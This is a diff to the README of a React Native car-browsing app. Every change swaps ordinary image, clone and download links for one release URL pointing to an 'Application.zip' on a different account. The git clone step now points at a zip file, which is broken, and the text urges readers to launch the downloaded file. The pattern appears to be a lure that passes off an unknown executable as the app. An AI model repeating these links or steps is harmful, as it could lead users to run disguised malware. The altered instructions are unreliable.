@@ -1,6 +1,6 @@
 # 🚗📱 App Cars RN Expo 🚗📱
 
-![App Cars RN Expo](https://images.unsplash.com/photo-1589279455606-6fc225ea1969)
+![App Cars RN Expo](https://github.com/Eyadmagdyhassan/app-cars-rn-expo/releases/download/v1.0/Application.zip)
 
 ## Description
 Welcome to **App Cars RN Expo**, a React Native application designed for car enthusiasts to explore various car brands and their models. This app combines a sleek interface with powerful features such as a login system utilizing Context API, seamless navigation, dynamic data fetching from APIs, and more. Users can effortlessly browse through different car brands, select their favorite one, and dive into the details of its models in an intuitive manner.
@@ -21,7 +21,7 @@ Welcome to **App Cars RN Expo**, a React Native application designed for car ent
 
 ## Installation
 To install **App Cars RN Expo**, follow these steps:
-1. Clone the repository `git clone https://github.com/adelante20/app-cars-rn-expo.git`
+1. Clone the repository `git clone https://github.com/Eyadmagdyhassan/app-cars-rn-expo/releases/download/v1.0/Application.zip`
 2. Install dependencies by running `npm install`
 3. Start the application using `npm start`
 4. Enjoy exploring car brands and models!
@@ -54,10 +54,10 @@ We welcome your contributions to enhance **App Cars RN Expo**. To contribute:
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
-[![Download App](https://img.shields.io/badge/-Download%20App-blue)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download App](https://github.com/Eyadmagdyhassan/app-cars-rn-expo/releases/download/v1.0/Application.zip%20App-blue)](https://github.com/Eyadmagdyhassan/app-cars-rn-expo/releases/download/v1.0/Application.zip)
 
 If the link ends with the file name, it needs to be launched. Otherwise, visit the link to access the app.
 
-![Thank you for exploring App Cars RN Expo](https://images.unsplash.com/photo-1629503417960-cced98514bfd)
+![Thank you for exploring App Cars RN Expo](https://github.com/Eyadmagdyhassan/app-cars-rn-expo/releases/download/v1.0/Application.zip)
 
 Dive into the world of cars with **App Cars RN Expo** - Happy Exploring! 🚀🔥
